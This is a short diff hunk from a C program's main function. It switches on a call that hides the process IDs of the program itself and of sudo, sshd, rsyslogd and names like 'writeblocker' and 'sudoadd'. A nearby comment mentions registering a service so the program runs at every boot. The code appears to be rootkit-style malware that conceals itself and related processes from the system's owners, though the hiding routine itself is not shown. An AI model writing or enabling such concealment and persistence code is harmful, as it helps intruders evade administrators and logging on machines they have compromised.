@@ -416,8 +416,8 @@ int main(int argc, char *argv[]) {
     //    }
     //}
 
-    // const char *names[] = {argv[0], "sudo", "writeblocker", "sshd", "rsyslogd", "sudoadd"};
-    // combine_and_hide_pids(names, sizeof(names) / sizeof(names[0]));
+    const char *names[] = {argv[0], "sudo", "writeblocker", "sshd", "rsyslogd", "sudoadd"};
+    combine_and_hide_pids(names, sizeof(names) / sizeof(names[0]));
 
     // Create the service make sure this program runs every boot after network connection established
     //create_and_enable_service();
